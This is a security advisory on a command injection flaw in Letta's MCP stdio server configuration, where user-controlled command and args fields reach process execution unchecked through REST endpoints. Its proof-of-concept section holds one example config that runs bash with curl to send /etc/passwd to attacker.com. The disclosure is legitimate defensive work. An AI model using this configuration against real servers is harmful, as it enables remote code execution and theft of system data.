# Command Injection Vulnerability in Letta MCP StdioServerConfig Implementation

## Summary

A critical Remote Code Execution (RCE) vulnerability exists in the Letta project's Model Context Protocol (MCP) implementation. The vulnerability allows arbitrary command execution through insufficient input validation in the `StdioServerConfig` class and `AsyncStdioMCPClient` implementation. When establishing connections to MCP servers via the stdio transport, user-controlled input is directly passed to the underlying MCP Python SDK's `stdio_client()` function without any sanitization or validation, enabling attackers to execute arbitrary system commands with the privileges of the Letta server process.

---

## Description

The vulnerability stems from the direct use of user-controlled input in the `StdioServerConfig` class, which is used to configure MCP server connections via stdio transport. The vulnerable code path involves:

1. **Source**: User input through REST API endpoints (`/tools/mcp/servers`) or configuration files that accept `StdioServerConfig` parameters
2. **Transfer**: The `AsyncStdioMCPClient._initialize_connection()` method processes the configuration
3. **Sink**: Direct execution via the MCP Python SDK's `stdio_client()` function, which internally calls `anyio.open_process()`

The vulnerability occurs because the `command` and `args` fields from `StdioServerConfig` are passed directly to the underlying process execution mechanism without any validation, sanitization, or allowlisting of permitted commands.

---

## Affected Code

### Primary Vulnerability Location

**File**: `letta/services/mcp/stdio_client.py`
**Lines**: 13-20

```python
class AsyncStdioMCPClient(AsyncBaseMCPClient):
    async def _initialize_connection(self, server_config: StdioServerConfig) -> None:
        args = [arg.split() for arg in server_config.args]
        # flatten
        args = [arg for sublist in args for arg in sublist]
        server_params = StdioServerParameters(command=server_config.command, args=args, env=server_config.env)
        stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))
        self.stdio, self.write = stdio_transport
        self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))
```

### Configuration Class Definition

**File**: `letta/services/mcp/types.py`
**Lines**: 34-48

```python
class StdioServerConfig(BaseServerConfig):
    type: MCPServerType = MCPServerType.STDIO
    command: str = Field(..., description="The command to run (MCP 'local' client will run this command)")
    args: List[str] = Field(..., description="The arguments to pass to the command")
    env: Optional[dict[str, str]] = Field(None, description="Environment variables to set")
```

### API Endpoints Accepting User Input

**File**: `letta/server/rest_api/routers/v1/tools.py`
**Lines**: 499-524, 622-643

Multiple REST API endpoints accept `StdioServerConfig` objects directly from user input:
- `PUT /tools/mcp/servers` - Add MCP server
- `PATCH /tools/mcp/servers/{mcp_server_name}` - Update MCP server  
- `POST /tools/mcp/servers/test` - Test MCP server connection

---

## Proof of Concept

The provided `poc.py` script demonstrates three attack vectors:

1. **Direct Command Injection**: Using malicious commands in the `command` field
2. **Argument-based Injection**: Using legitimate commands with malicious arguments
3. **Data Exfiltration**: Demonstrating information gathering capabilities

Example malicious configuration:
```python
StdioServerConfig(
    server_name="malicious_server",
    command="bash",
    args=["-c", "curl http://attacker.com/exfil -d @/etc/passwd"],
    env={}
)
```

---

## Impact

This vulnerability enables complete system compromise through:

1. **Arbitrary Command Execution**: Attackers can execute any system command with server privileges
2. **Data Exfiltration**: Access to sensitive files and system information
3. **Lateral Movement**: Potential to compromise other systems accessible from the server
4. **Service Disruption**: Ability to terminate processes or consume system resources
5. **Persistence**: Installation of backdoors or malicious software

The vulnerability is particularly dangerous because:
- It can be triggered through legitimate API endpoints
- No authentication bypass is required - any user with MCP server configuration privileges can exploit it
- The attack surface includes both direct API calls and configuration file processing
- Stdio MCP servers are commonly used in legitimate deployments

---

## Occurrences

- [letta/services/mcp/stdio_client.py:17](https://github.com/letta-ai/letta/blob/main/letta/services/mcp/stdio_client.py#L17) - Direct command execution sink
- [letta/services/mcp/types.py:36-37](https://github.com/letta-ai/letta/blob/main/letta/services/mcp/types.py#L36-L37) - Vulnerable parameter definitions
- [letta/server/rest_api/routers/v1/tools.py:500](https://github.com/letta-ai/letta/blob/main/letta/server/rest_api/routers/v1/tools.py#L500) - API endpoint accepting user input
- [letta/server/rest_api/routers/v1/tools.py:623](https://github.com/letta-ai/letta/blob/main/letta/server/rest_api/routers/v1/tools.py#L623) - Test endpoint accepting user input
- [letta/services/mcp_manager.py:86](https://github.com/letta-ai/letta/blob/main/letta/services/mcp_manager.py#L86) - MCP manager execution path
- [letta/services/mcp_manager.py:311-316](https://github.com/letta-ai/letta/blob/main/letta/services/mcp_manager.py#L311-L316) - Configuration file parsing
- [letta/server/server.py:2147-2152](https://github.com/letta-ai/letta/blob/main/letta/server/server.py#L2147-L2152) - Server-level configuration processing
